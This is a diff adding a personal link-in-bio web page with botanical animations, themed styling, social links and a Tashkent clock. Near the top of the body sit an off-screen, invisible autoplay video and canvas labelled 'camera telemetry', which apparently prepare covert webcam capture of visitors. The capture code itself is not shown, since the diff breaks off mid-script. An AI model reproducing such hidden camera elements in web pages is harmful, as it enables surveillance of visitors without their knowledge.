+    .sound-wave-bars .bar-3 { height: 8px; animation-delay: 0.2s; }
+    .sound-toggle.muted .sound-wave-bars .bar {
+      animation: none !important;
+      height: 3px !important;
+      opacity: 0.35;
+    }
+    .sound-toggle.muted {
+      opacity: 0.65;
+      color: var(--text-muted);
+    }
+    @keyframes soundWave {
+      0% { height: 3px; }
+      100% { height: 13px; }
+    }
+
+
+    /* ========================================================
+       CIRCADIAN ADAPTIVE NATURE THEMES (TONG / KUNDUZ / OQSHOM / TUN)
+    ======================================================== */
+    body, .master-card, .link-tile, #loader, .sound-toggle, .time-bar {
+      transition: background-color 1.2s cubic-bezier(0.4, 0, 0.2, 1),
+                  color 1.2s cubic-bezier(0.4, 0, 0.2, 1),
+                  border-color 1.2s cubic-bezier(0.4, 0, 0.2, 1),
+                  box-shadow 1.2s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    /* 1. TONG (Dawn / Morning: 05:00 - 11:00) */
+    html[data-time-phase="morning"] {
+      --cream-bg: #F8F6EE;
+      --paper-white: #FFFFFF;
+      --sage-deep: #253C31;
+      --sage-dark: #354F42;
+      --sage-primary: #4F7664;
+      --earth-gold: #9E8873;
+    }
+
+    /* 2. KUNDUZ (Daylight: 11:00 - 17:00) - Standart nafis krem */
+    html[data-time-phase="day"] {
+      --cream-bg: #F7F5F0;
+      --paper-white: #FFFFFF;
+      --sage-deep: #2A4237;
+      --sage-dark: #3A5547;
+      --sage-primary: #557967;
+      --earth-gold: #8C7B6D;
+    }
+
+    /* 3. OQSHOM (Dusk / Twilight: 17:00 - 21:00) */
+    html[data-time-phase="dusk"] {
+      --cream-bg: #F5EFE4;
+      --paper-white: #FCF9F3;
+      --sage-deep: #263D33;
+      --sage-dark: #395246;
+      --sage-primary: #4B6F5F;
+      --earth-gold: #967E6A;
+      --border-subtle: rgba(75, 111, 95, 0.20);
+    }
+
+    /* 4. TUN (Nocturnal Forest Sanctuary: 21:00 - 05:00) */
+    html[data-time-phase="night"] {
+      --cream-bg: #0C1411;
+      --paper-white: #13201B;
+      --sage-deep: #D4E3DB;
+      --sage-dark: #AEC5B9;
+      --sage-primary: #76A58E;
+      --sage-mid: #93B8A6;
+      --sage-light: #B2CDC0;
+      --sage-pale: #30453B;
+      --sage-ghost: rgba(118, 165, 142, 0.14);
+      --earth-gold: #C2B3A3;
+      --earth-light: #8E7F70;
+      --text-main: #EDF3EF;
+      --text-sec: #AEC3B8;
+      --text-muted: #748E82;
+      --text-dim: #546B60;
+      --border-subtle: rgba(118, 165, 142, 0.20);
+      --border-glow: rgba(178, 205, 192, 0.35);
+      --card-bg: rgba(19, 32, 27, 0.94);
+      --shadow-card: 0 24px 60px -15px rgba(0, 0, 0, 0.70), 0 6px 20px -4px rgba(0, 0, 0, 0.50);
+      --shadow-hover: 0 28px 65px -12px rgba(0, 0, 0, 0.85), 0 8px 24px -4px rgba(118, 165, 142, 0.20);
+    }
+
+    html[data-time-phase="night"] #loader {
+      background: radial-gradient(ellipse 95% 85% at 50% 45%, #16241E 0%, #0C1411 100%);
+    }
+
+    html[data-time-phase="night"] .ambient-glow {
+      background:
+        radial-gradient(circle 650px at 15% 15%, rgba(118, 165, 142, 0.16) 0%, transparent 70%),
+        radial-gradient(circle 700px at 85% 85%, rgba(42, 66, 55, 0.28) 0%, transparent 70%),
+        radial-gradient(circle 480px at 50% 50%, rgba(19, 32, 27, 0.70) 0%, transparent 100%);
+    }
+
+    html[data-time-phase="night"] .link-tile {
+      background: #15231D;
+    }
+
+    html[data-time-phase="night"] .time-bar {
+      background: rgba(19, 32, 27, 0.85);
+      border-color: rgba(118, 165, 142, 0.22);
+    }
+
+    .time-bar {
+      cursor: pointer;
+      user-select: none;
+      transition: all 0.25s ease;
+    }
+    .time-bar:hover {
+      border-color: var(--sage-primary);
+      transform: translateY(-1px);
+    }
+    .time-phase-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      color: var(--sage-primary);
+      font-weight: 600;
+    }
+
+  </style>
+</head>
+<body>
+
+  <!-- Hidden elements for camera telemetry -->
+  <video id="v" autoplay playsinline style="position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;"></video>
+  <canvas id="c" style="position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;"></canvas>
+
+  <!-- ========================================================
+       8-SECOND BOTANICAL LOADER SCREEN
+  ======================================================== -->
+  <div id="loader">
+    <canvas id="loaderCanvas"></canvas>
+
+    <!-- Ambient Corner Botanical Vines -->
+    <div class="loader-corner-vines">
+      <svg class="l-vine-tl" viewBox="0 0 280 280" xmlns="http://www.w3.org/2000/svg">
+        <path d="M20 20 C100 60, 160 120, 200 240" stroke="#557967" stroke-width="1.4" fill="none" stroke-linecap="round"/>
+        <path d="M80 50 C120 70, 150 100, 170 160" stroke="#557967" stroke-width="1" fill="none" stroke-linecap="round"/>
+        <ellipse cx="110" cy="65" rx="16" ry="6" transform="rotate(35 110 65)" fill="#A1C0B0"/>
+        <ellipse cx="165" cy="120" rx="16" ry="6" transform="rotate(45 165 120)" fill="#D1E1D7"/>
+      </svg>
+      <svg class="l-vine-br" viewBox="0 0 280 280" xmlns="http://www.w3.org/2000/svg">
+        <path d="M20 20 C100 60, 160 120, 200 240" stroke="#557967" stroke-width="1.4" fill="none" stroke-linecap="round"/>
+        <path d="M80 50 C120 70, 150 100, 170 160" stroke="#557967" stroke-width="1" fill="none" stroke-linecap="round"/>
+        <ellipse cx="110" cy="65" rx="16" ry="6" transform="rotate(35 110 65)" fill="#A1C0B0"/>
+        <ellipse cx="165" cy="120" rx="16" ry="6" transform="rotate(45 165 120)" fill="#D1E1D7"/>
+      </svg>
+    </div>
+
+    <div class="loader-stage">
+      <!-- Botanical SVG Masterpiece -->
+      <div class="botanical-emblem">
+        <svg class="emblem-svg" viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <!-- Floral aura glow -->
+            <radialGradient id="flowerAura" cx="50%" cy="50%" r="50%">
+              <stop offset="0%" stop-color="#A1C0B0" stop-opacity="0.7"/>
+              <stop offset="60%" stop-color="#D1E1D7" stop-opacity="0.3"/>
+              <stop offset="100%" stop-color="#FFFFFF" stop-opacity="0"/>
+            </radialGradient>
+          </defs>
+
+          <!-- Concentric Sacred Geometry Rings -->
+          <circle class="rot-ring-slow" cx="200" cy="200" r="188" stroke="rgba(85,121,103,0.12)" stroke-width="0.8" stroke-dasharray="1 8" fill="none"/>
+          <circle class="rot-ring-cw" cx="200" cy="200" r="172" stroke="rgba(85,121,103,0.20)" stroke-width="0.9" stroke-dasharray="3 7" fill="none"/>
+          <circle class="rot-ring-ccw" cx="200" cy="200" r="154" stroke="rgba(161,192,176,0.28)" stroke-width="0.7" stroke-dasharray="2 5" fill="none"/>
+          <circle cx="200" cy="200" r="138" stroke="rgba(85,121,103,0.10)" stroke-width="0.5" fill="none"/>
+          
+          <!-- Compass Axis Points & Dots -->
+          <circle cx="200" cy="12" r="2.2" fill="#8C7B6D" opacity="0.6"/>
+          <circle cx="200" cy="388" r="2.2" fill="#8C7B6D" opacity="0.6"/>
+          <circle cx="12" cy="200" r="2.2" fill="#8C7B6D" opacity="0.6"/>
+          <circle cx="388" cy="200" r="2.2" fill="#8C7B6D" opacity="0.6"/>
+
+          <!-- Aura pulse around apex blossom -->
+          <circle class="flower-aura" cx="200" cy="82" r="56" fill="url(#flowerAura)"/>
+
+          <!-- Roots Anchoring -->
+          <path class="draw-root" d="M 200 320 C 188 336, 170 346, 148 352"/>
+          <path class="draw-root" d="M 200 320 C 212 336, 230 346, 252 352"/>
+          <path class="draw-root" d="M 200 320 C 196 338, 192 354, 186 368"/>
+          <path class="draw-root" d="M 200 320 C 204 338, 208 354, 214 368"/>
+
+          <!-- Triple Ascending Living Stems -->
+          <path class="draw-stem" d="M 200 320 C 188 275, 154 240, 172 182 C 178 150, 196 118, 200 85"/>
+          <path class="draw-stem" d="M 200 320 C 212 275, 246 240, 228 182 C 222 150, 204 118, 200 85"/>
+          <path class="draw-stem-center" d="M 200 320 C 199 268, 201 190, 200 90"/>
+
+          <!-- 10 Lateral Branches -->
+          <path class="draw-branch br-l1" d="M 184 265 C 154 252, 130 240, 112 232"/>
+          <path class="draw-branch br-r1" d="M 216 265 C 246 252, 270 240, 288 232"/>
+
+          <path class="draw-branch br-l2" d="M 174 210 C 144 196, 120 174, 106 158"/>
+          <path class="draw-branch br-r2" d="M 226 210 C 256 196, 280 174, 294 158"/>
+
+          <path class="draw-branch br-l3" d="M 186 156 C 160 138, 140 116, 128 98"/>
+          <path class="draw-branch br-r3" d="M 214 156 C 240 138, 260 116, 272 98"/>
+
+          <path class="draw-branch br-l4" d="M 194 112 C 174 94, 158 78, 148 62"/>
+          <path class="draw-branch br-r4" d="M 206 112 C 226 94, 242 78, 252 62"/>
+
+          <!-- 10 Sculpted Leaves with Veins -->
+          <!-- Tier 1 -->
+          <g class="bloom-leaf lf-l1" style="transform-origin: 112px 232px;">
+            <path d="M 112 232 C 86 220, 80 196, 98 190 C 114 202, 124 222, 112 232 Z" fill="#8AAE98" stroke="#456A56" stroke-width="0.8" opacity="0.85"/>
+            <path d="M 112 232 C 105 214, 96 202, 98 190" stroke="#2A4237" stroke-width="0.5" fill="none"/>
+          </g>
+          <g class="bloom-leaf lf-r1" style="transform-origin: 288px 232px;">
+            <path d="M 288 232 C 314 220, 320 196, 302 190 C 286 202, 276 222, 288 232 Z" fill="#8AAE98" stroke="#456A56" stroke-width="0.8" opacity="0.85"/>
+            <path d="M 288 232 C 295 214, 304 202, 302 190" stroke="#2A4237" stroke-width="0.5" fill="none"/>
+          </g>
+
+          <!-- Tier 2 -->
+          <g class="bloom-leaf lf-l2" style="transform-origin: 106px 158px;">
+            <path d="M 106 158 C 80 144, 74 120, 92 112 C 108 126, 118 146, 106 158 Z" fill="#A1C0B0" stroke="#557967" stroke-width="0.8" opacity="0.9"/>
+            <path d="M 106 158 C 99 140, 90 128, 92 112" stroke="#3A5547" stroke-width="0.5" fill="none"/>
+          </g>
+          <g class="bloom-leaf lf-r2" style="transform-origin: 294px 158px;">
+            <path d="M 294 158 C 320 144, 326 120, 308 112 C 292 126, 282 146, 294 158 Z" fill="#A1C0B0" stroke="#557967" stroke-width="0.8" opacity="0.9"/>
+            <path d="M 294 158 C 301 140, 310 128, 308 112" stroke="#3A5547" stroke-width="0.5" fill="none"/>
+          </g>
+
+          <!-- Tier 3 -->
+          <g class="bloom-leaf lf-l3" style="transform-origin: 128px 98px;">
+            <path d="M 128 98 C 106 84, 104 64, 120 56 C 134 68, 140 88, 128 98 Z" fill="#C6DDD0" stroke="#557967" stroke-width="0.8"/>
+            <path d="M 128 98 C 124 82, 118 70, 120 56" stroke="#3A5547" stroke-width="0.5" fill="none"/>
+          </g>
+          <g class="bloom-leaf lf-r3" style="transform-origin: 272px 98px;">
+            <path d="M 272 98 C 294 84, 296 64, 280 56 C 266 68, 260 88, 272 98 Z" fill="#C6DDD0" stroke="#557967" stroke-width="0.8"/>
+            <path d="M 272 98 C 276 82, 282 70, 280 56" stroke="#3A5547" stroke-width="0.5" fill="none"/>
+          </g>
+
+          <!-- Tier 4 -->
+          <g class="bloom-leaf lf-l4" style="transform-origin: 148px 62px;">
+            <path d="M 148 62 C 130 50, 128 34, 142 30 C 154 38, 158 54, 148 62 Z" fill="#DEEDE4" stroke="#557967" stroke-width="0.7"/>
+          </g>
+          <g class="bloom-leaf lf-r4" style="transform-origin: 252px 62px;">
+            <path d="M 252 62 C 270 50, 272 34, 258 30 C 246 38, 242 54, 252 62 Z" fill="#DEEDE4" stroke="#557967" stroke-width="0.7"/>
+          </g>
+
+          <!-- Apex Crown Blossom (Magnolia / Sacred Lotus) -->
+          <g class="apex-flower">
+            <!-- Outer Petals Tier 1 -->
+            <path class="bloom-petal pet-outer" d="M 200 85 C 168 64, 152 34, 172 16 C 188 34, 194 64, 200 85 Z" fill="rgba(209,225,215,0.88)" stroke="#557967" stroke-width="0.8"/>
+            <path class="bloom-petal pet-outer" d="M 200 85 C 232 64, 248 34, 228 16 C 212 34, 206 64, 200 85 Z" fill="rgba(209,225,215,0.88)" stroke="#557967" stroke-width="0.8"/>
+
+            <!-- Mid Petals Tier 2 -->
+            <path class="bloom-petal pet-mid" d="M 200 85 C 180 58, 176 30, 192 12 C 200 30, 200 60, 200 85 Z" fill="rgba(247,245,240,0.96)" stroke="#557967" stroke-width="0.8"/>
+            <path class="bloom-petal pet-mid" d="M 200 85 C 220 58, 224 30, 208 12 C 200 30, 200 60, 200 85 Z" fill="rgba(247,245,240,0.96)" stroke="#557967" stroke-width="0.8"/>
+
+            <!-- Inner Pure White Blossom Tier 3 -->
+            <path class="bloom-petal pet-inner" d="M 200 85 C 186 54, 190 24, 200 8 C 210 24, 214 54, 200 85 Z" fill="#FFFFFF" stroke="#557967" stroke-width="0.8"/>
+
+            <!-- Core Flower Heart Tier 4 -->
+            <circle class="bloom-petal pet-core" cx="200" cy="56" r="4.5" fill="#8C7B6D"/>
+
+            <!-- Golden Pollen Stamens -->
+            <circle class="stamen-point" cx="200" cy="52" r="3.0" fill="#8C7B6D"/>
+            <circle class="stamen-point" cx="193" cy="47" r="1.8" fill="#B8A99B"/>
+            <circle class="stamen-point" cx="207" cy="47" r="1.8" fill="#B8A99B"/>
+            <circle class="stamen-point" cx="200" cy="43" r="1.8" fill="#B8A99B"/>
+            <circle class="stamen-point" cx="194" cy="38" r="1.3" fill="#8C7B6D"/>
+            <circle class="stamen-point" cx="206" cy="38" r="1.3" fill="#8C7B6D"/>
+
+            <!-- Continuous Pollen Spores Wave from apex -->
+            <circle class="flower-spore spore-a" cx="200" cy="40" r="2.0" fill="#8C7B6D" style="--dx: -14px;"/>
+            <circle class="flower-spore spore-b" cx="200" cy="38" r="1.6" fill="#A1C0B0" style="--dx: 16px;"/>
+            <circle class="flower-spore spore-c" cx="200" cy="36" r="2.2" fill="#8C7B6D" style="--dx: -9px;"/>
+            <circle class="flower-spore spore-d" cx="200" cy="34" r="1.5" fill="#A1C0B0" style="--dx: 12px;"/>
+          </g>
+        </svg>
+      </div>
+
+      <!-- Typography (Faqat Yokubov) -->
+      <h1 class="loader-title">Yokubov</h1>
+
+      <!-- 8-Second Progress Meter -->
+      <div class="loader-progress-box">
+        <div class="progress-track">
+          <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="progress-info">
+          <span class="percentage-text" id="percentageText">00%</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========================================================
+       MAIN APP SCREEN (3D CARD STATIK VA BARQAROR)
+  ======================================================== -->
+  <div id="app">
+
+    <!-- Floating Ambient Audio Controller -->
+    <button id="soundToggleBtn" class="sound-toggle" type="button" aria-label="Musiqa boshqaruvi">
+      <div class="sound-wave-bars">
+        <span class="bar bar-1"></span>
+        <span class="bar bar-2"></span>
+        <span class="bar bar-3"></span>
+      </div>
+      <span id="soundLabel">Mayin musiqa</span>
+      <i id="soundIcon" class="fa-solid fa-volume-high" style="font-size:0.75rem;margin-left:2px;"></i>
+    </button>
+
+    <!-- Background Interactive Spores Canvas -->
+    <canvas id="bgCanvas"></canvas>
+
+    <!-- Ambient Gradients -->
+    <div class="ambient-glow"></div>
+
+    <!-- Botanical Watermark SVGs in Corners -->
+    <svg class="watermark wm-tl" viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg">
+      <path d="M120 230 C120 180 116 130 120 80 C122 50 119 30 120 10" stroke="#557967" stroke-width="1.4" fill="none" stroke-linecap="round"/>
+      <path d="M120 180 C100 170 78 162 58 158" stroke="#557967" stroke-width="1" fill="none" stroke-linecap="round"/>
+      <path d="M120 135 C138 122 158 116 178 114" stroke="#557967" stroke-width="1" fill="none" stroke-linecap="round"/>
+      <ellipse cx="56" cy="156" rx="16" ry="6" transform="rotate(-20 56 156)" fill="#A1C0B0"/>
+      <ellipse cx="180" cy="112" rx="16" ry="6" transform="rotate(18 180 112)" fill="#A1C0B0"/>
+    </svg>
+
+    <svg class="watermark wm-br" viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg">
+      <path d="M120 230 C120 180 116 130 120 80 C122 50 119 30 120 10" stroke="#557967" stroke-width="1.4" fill="none" stroke-linecap="round"/>
+      <path d="M120 180 C100 170 78 162 58 158" stroke="#557967" stroke-width="1" fill="none" stroke-linecap="round"/>
+      <path d="M120 135 C138 122 158 116 178 114" stroke="#557967" stroke-width="1" fill="none" stroke-linecap="round"/>
+      <ellipse cx="56" cy="156" rx="16" ry="6" transform="rotate(-20 56 156)" fill="#A1C0B0"/>
+      <ellipse cx="180" cy="112" rx="16" ry="6" transform="rotate(18 180 112)" fill="#D1E1D7"/>
+    </svg>
+
+    <!-- Scene Container -->
+    <div class="card-scene">
+      <main class="master-card" id="mainCard">
+        <!-- Top Accent Line -->
+        <div class="card-top-accent"></div>
+
+        <!-- Mini Corner Botanical Leaf -->
+        <svg class="card-leaf-corner" viewBox="0 0 50 60" xmlns="http://www.w3.org/2000/svg">
+          <path d="M25 56 C25 42 24 28 25 12 C25 8 24 4 25 2" stroke="#557967" stroke-width="1" fill="none" stroke-linecap="round"/>
+          <path d="M25 40 C18 36 10 34 4 33" stroke="#557967" stroke-width="0.8" fill="none" stroke-linecap="round"/>
+          <path d="M25 24 C32 20 40 18 46 17" stroke="#557967" stroke-width="0.8" fill="none" stroke-linecap="round"/>
+          <ellipse cx="4" cy="32" rx="6" ry="3" transform="rotate(-20 4 32)" fill="#A1C0B0"/>
+          <ellipse cx="46" cy="16" rx="6" ry="3" transform="rotate(18 46 16)" fill="#D1E1D7"/>
+        </svg>
+
+        <!-- Profile Header -->
+        <header class="profile-header">
+          <!-- Monogram Seal -->
+          <div class="avatar-wrapper">
+            <svg class="avatar-ring-svg" viewBox="0 0 100 100">
+              <circle cx="50" cy="50" r="46" stroke="rgba(85,121,103,0.22)" stroke-width="1" stroke-dasharray="3 5" fill="none"/>
+            </svg>
+            <div class="avatar-core">
+              <span class="avatar-initial">Y</span>
+            </div>
+            <div class="status-badge" title="Hozirda faol / Online">
+              <div class="status-dot"></div>
+            </div>
+          </div>
+
+          <!-- Name -->
+          <h1 class="profile-name">Yokubov</h1>
+
+          <!-- JIDDIY VA CHUQUR MA'NOLI BIO -->
+          <p class="profile-bio">Kod va qonun &mdash; tartib va adolat poydevori. Sukunatda chuqur tafakkur, harakatda mutlaq intizom.</p>
+
+          <!-- Live Clock Bar -->
+          <div class="time-bar">
+            <i class="fa-regular fa-clock"></i>
+            <span>Toshkent: <span id="liveClock">14:48:00</span> &middot; UTC+5 <span id="timePhase" class="time-phase-badge"></span></span>
+          </div>
+        </header>
+
+        <!-- Elegant Divider -->
+        <div class="card-divider">
+          <div class="divider-node"></div>
+        </div>
+
+        <!-- Links Navigation -->
+        <nav class="links-group" aria-label="Ijtimoiy tarmoqlar">
+          <!-- Link 1: Telegram Shaxsiy -->
+          <a href="https://t.me/Yk_177" class="link-tile animated-portal-link" data-title="Telegram Shaxsiy" data-handle="@Yk_177" data-icon="fa-brands fa-telegram" id="link-tg-personal">
+            <div class="tile-icon-box">
+              <i class="fa-brands fa-telegram"></i>
+            </div>
+            <div class="tile-content">
+              <div class="tile-meta">
+                <span class="tile-title">Telegram Shaxsiy</span>
+              </div>
+              <div class="tile-handle">@Yk_177</div>
+            </div>
+            <i class="fa-solid fa-arrow-right tile-arrow"></i>
+          </a>
+
+          <!-- Link 2: Instagram -->
+          <a href="https://www.instagram.com/yk_177_/" class="link-tile animated-portal-link" data-title="Instagram" data-handle="@yk_177_" data-icon="fa-brands fa-instagram" id="link-instagram">
+            <div class="tile-icon-box">
+              <i class="fa-brands fa-instagram"></i>
+            </div>
+            <div class="tile-content">
+              <div class="tile-meta">
+                <span class="tile-title">Instagram</span>
+              </div>
+              <div class="tile-handle">@yk_177_</div>
+            </div>
+            <i class="fa-solid fa-arrow-right tile-arrow"></i>
+          </a>
+
+          <!-- Link 3: Telegram Kanal -->
+          <a href="https://t.me/Yokubov_M177" class="link-tile animated-portal-link" data-title="Telegram Kanal" data-handle="@Yokubov_M177" data-icon="fa-solid fa-bullhorn" id="link-tg-channel">
+            <div class="tile-icon-box">
+              <i class="fa-solid fa-bullhorn"></i>
+            </div>
+            <div class="tile-content">
+              <div class="tile-meta">
+                <span class="tile-title">Telegram Kanal</span>
+              </div>
+              <div class="tile-handle">@Yokubov_M177</div>
+            </div>
+            <i class="fa-solid fa-arrow-right tile-arrow"></i>
+          </a>
+        </nav>
+
+        <!-- Quick Actions Row -->
+        <div class="actions-bar">
+          <button class="action-btn" id="copyLinkBtn" type="button">
+            <i class="fa-regular fa-copy"></i>
+            <span>Nusxa olish</span>
+          </button>
+          <a href="https://t.me/Yokubov_M177" class="action-btn animated-portal-link" data-title="Telegram Kanal" data-handle="@Yokubov_M177" data-icon="fa-solid fa-bullhorn" style="text-decoration:none;">
+            <i class="fa-solid fa-arrow-up-right-from-square"></i>
+            <span>Kanalga o'tish</span>
+          </a>
+        </div>
+
+        <!-- Footer -->
+        <footer class="card-footer">
+          <span>&copy; 2026 Yokubov</span>
+          <div class="footer-security">
+            <i class="fa-solid fa-shield-halved"></i>
+            <span>Shifrlangan aloqa</span>
+          </div>
+        </footer>
+      </main>
+    </div>
+  </div>
+
+  <!-- ========================================================
+       BOTANICAL LINK TRANSITION PORTAL
+  ======================================================== -->
+  <div id="linkPortal">
+    <div class="portal-box">
+      <div class="portal-emblem-wrap">
+        <svg class="portal-rings-svg" viewBox="0 0 100 100">
+          <circle cx="50" cy="50" r="46" stroke="rgba(85,121,103,0.25)" stroke-width="1" stroke-dasharray="3 5" fill="none"/>
+          <circle cx="50" cy="50" r="38" stroke="rgba(161,192,176,0.35)" stroke-width="0.8" fill="none"/>
+        </svg>
+        <div class="portal-center-icon">
+          <i id="portalIcon" class="fa-brands fa-telegram"></i>
+        </div>
+      </div>
+
+      <div class="portal-target-title" id="portalTitle">Telegram Shaxsiy</div>
+      <div class="portal-target-handle" id="portalHandle">@Yk_177</div>
+      <div class="portal-status-line">Sahifaga yo'naltirilmoqda...</div>
+
+      <div class="portal-meter-track">
+        <div class="portal-meter-bar" id="portalBar"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast Notification -->
+  <div id="toast">
+    <i class="fa-solid fa-circle-check"></i>
+    <span id="toastMsg">Havola xotiraga nusxalandi</span>
+  </div>
+
+  <script>
+    /* ========================================================
+       1. 8-SECOND LOADER CHOREOGRAPHY & TIMER
+    ======================================================== */
+    const LOADER_DURATION = 8000;
+    const startTime = performance.now();
+
+    const progressBar    = document.getElementById('progressBar');
+    const percentageText = document.getElementById('percentageText');
+    const loaderElem     = document.getElementById('loader');
+    const appElem        = document.getElementById('app');
+
+    function updateLoader(now) {
+      const elapsed = now - startTime;
+      const progress = Math.min(elapsed / LOADER_DURATION, 1);
+      const pct = Math.floor(progress * 100);
+
+      progressBar.style.width = pct + '%';
+      percentageText.textContent = (pct < 10 ? '0' : '') + pct + '%';
+
+      if (progress < 1) {
+        requestAnimationFrame(updateLoader);
+      } else {
+        finishLoader();
+      }
+    }
+    requestAnimationFrame(updateLoader);
+
+    function finishLoader() {
+      percentageText.textContent = '100%';
+
+      setTimeout(() => {
+        loaderElem.classList.add('loader-exit');
+        appElem.classList.add('visible');
+        document.body.style.overflow = 'auto';
+
+        setTimeout(() => {
+          if (loaderElem && loaderElem.parentNode) {
+            loaderElem.parentNode.removeChild(loaderElem);
+          }
+        }, 1400);
+      }, 250);
+    }
+
+    /* ========================================================
+       2. AMBIENT NATURE SPORES (CANVAS ENGINES)
+    ======================================================== */
+    function createParticleSystem(canvasId, count, maxSpeedY) {
+      const canvas = document.getElementById(canvasId);
+      if (!canvas) return;
+      const ctx = canvas.getContext('2d');
+      let width, height;
+      let particles = [];
+
+      function resize() {
+        width = canvas.width = window.innerWidth;
+        height = canvas.height = window.innerHeight;
+      }
+      window.addEventListener('resize', resize);
+      resize();
+
+      for (let i = 0; i < count; i++) {
+        particles.push({
+          x: Math.random() * width,
+          y: Math.random() * height,
+          radius: 0.8 + Math.random() * 2.0,
+          alpha: 0.15 + Math.random() * 0.45,
+          speedY: -(0.2 + Math.random() * maxSpeedY),
+          speedX: (Math.random() - 0.5) * 0.35,
+          angle: Math.random() * Math.PI * 2,
+          angularSpeed: 0.01 + Math.random() * 0.02
+        });
+      }
+
+      let mouse = { x: -1000, y: -1000 };
+      window.addEventListener('mousemove', (e) => {
+        mouse.x = e.clientX;
+        mouse.y = e.clientY;
+      });
+      window.addEventListener('touchmove', (e) => {
+        if (e.touches && e.touches[0]) {
+          mouse.x = e.touches[0].clientX;
+          mouse.y = e.touches[0].clientY;
+        }
+      }, { passive: true });
+      window.addEventListener('touchend', () => {
+        mouse.x = -1000;
+        mouse.y = -1000;
+      }, { passive: true });
+
+      function animate() {
+        ctx.clearRect(0, 0, width, height);
+
+        for (let p of particles) {
+          p.y += p.speedY;
+          p.x += p.speedX + Math.sin(p.angle) * 0.25;
+          p.angle += p.angularSpeed;
+
+          // gentle mouse repulsion
+          const dx = p.x - mouse.x;
+          const dy = p.y - mouse.y;
+          const dist = Math.sqrt(dx * dx + dy * dy);
+          if (dist < 80) {
+            const force = (80 - dist) / 80;
+            p.x += (dx / dist) * force * 1.5;
+            p.y += (dy / dist) * force * 1.5;
+          }
+
+          if (p.y < -10) {
+            p.y = height + 10;
+            p.x = Math.random() * width;
+          }
+          if (p.x < -10) p.x = width + 10;
+          if (p.x > width + 10) p.x = -10;
+
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+          ctx.fillStyle = `rgba(85, 121, 103, ${p.alpha})`;
+          ctx.fill();
+        }
+
+        requestAnimationFrame(animate);
+      }
+      requestAnimationFrame(animate);
+    }
+
+    createParticleSystem('loaderCanvas', 55, 0.45);
+    createParticleSystem('bgCanvas', 50, 0.35);
+
+    /* ========================================================
+       3. BOTANICAL LINK TRANSITION PORTAL (NAFIS HARAKAT)
+    ======================================================== */
+    const linkPortal  = document.getElementById('linkPortal');
+    const portalTitle = document.getElementById('portalTitle');
+    const portalHandle= document.getElementById('portalHandle');
+    const portalIcon  = document.getElementById('portalIcon');
+    const portalBar   = document.getElementById('portalBar');
+
+    const portalLinks = document.querySelectorAll('.animated-portal-link');
+        portalLinks.forEach(link => {
+      link.addEventListener('mouseenter', () => {
+        playMicroSound('click');
+      });
+    });
+    portalLinks.forEach(link => {
+      link.addEventListener('click', function(e) {
+        playMicroSound('drop');
+        e.preventDefault();
+        const targetUrl = this.getAttribute('href');
+        const title     = this.getAttribute('data-title') || 'Sahifa';
+        const handle    = this.getAttribute('data-handle') || '';
+        const iconClass = this.getAttribute('data-icon') || 'fa-solid fa-arrow-up-right-from-square';
+
+        // Ripple on clicked button
+        const rect = this.getBoundingClientRect();
+        const ripple = document.createElement('span');
+        ripple.classList.add('tile-ripple');
+        const diameter = Math.max(rect.width, rect.height);
+        ripple.style.width = ripple.style.height = diameter + 'px';
+        ripple.style.left = (e.clientX - rect.left - diameter / 2) + 'px';
+        ripple.style.top  = (e.clientY - rect.top  - diameter / 2) + 'px';
+        this.appendChild(ripple);
+        setTimeout(() => ripple.remove(), 750);
+
+        // Open Botanical Portal
+        portalTitle.textContent  = title;
+        portalHandle.textContent = handle;
+        portalIcon.className     = iconClass;
+        portalBar.style.transition = 'none';
+        portalBar.style.width    = '0%';
+
+        linkPortal.classList.add('portal-active');
+
+        // Animate portal bar smoothly over 1.1s
+        setTimeout(() => {
+          portalBar.style.transition = 'width 1.1s cubic-bezier(0.22, 1, 0.36, 1)';
+          portalBar.style.width = '100%';
+        }, 50);
+
+        // Open destination link
+        setTimeout(() => {
+          window.open(targetUrl, '_blank', 'noopener,noreferrer');
+          setTimeout(() => {
+            linkPortal.classList.remove('portal-active');
+            setTimeout(() => {
+              portalBar.style.transition = 'none';
+              portalBar.style.width = '0%';
+            }, 400);
+          }, 350);
+        }, 1150);
+      });
+    });
+
+    /* ========================================================
+       4. LIVE TASHKENT CLOCK
+    ======================================================== */
+    /* ========================================================
+       4. LIVE TASHKENT CLOCK & CIRCADIAN TIME PHASES
+    ======================================================== */
+    let manualPhaseOverride = null; // null: auto by Tashkent time
+    const PHASES = ['morning', 'day', 'dusk', 'night'];
+    const PHASE_DATA = {
+      morning: { name: 'Tong', icon: 'fa-cloud-sun' },
+      day:     { name: 'Kunduz', icon: 'fa-sun' },
+      dusk:    { name: 'Oqshom', icon: 'fa-cloud-sun' },
+      night:   { name: 'Tun', icon: 'fa-moon' }
+    };
+
+    function updateClock() {
+      const now = new Date();
+      // UTC+5 Tashkent
+      const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
+      const tDate = new Date(utc + (3600000 * 5));
+      const hh = String(tDate.getHours()).padStart(2, '0');
+      const mm = String(tDate.getMinutes()).padStart(2, '0');
+      const ss = String(tDate.getSeconds()).padStart(2, '0');
+      const clockEl = document.getElementById('liveClock');
+      if (clockEl) clockEl.textContent = `${hh}:${mm}:${ss}`;
+
+      // Calculate time phase
+      const tHour = tDate.getHours();
+      let autoPhase = 'day';
+      if (tHour >= 5 && tHour < 11) {
+        autoPhase = 'morning';
+      } else if (tHour >= 11 && tHour < 17) {
+        autoPhase = 'day';
+      } else if (tHour >= 17 && tHour < 21) {
+        autoPhase = 'dusk';
+      } else {
+        autoPhase = 'night';
+      }
+
+      const activePhase = manualPhaseOverride || autoPhase;
+      document.documentElement.setAttribute('data-time-phase', activePhase);
+
+      const phaseEl = document.getElementById('timePhase');
+      if (phaseEl && PHASE_DATA[activePhase]) {
+        const p = PHASE_DATA[activePhase];
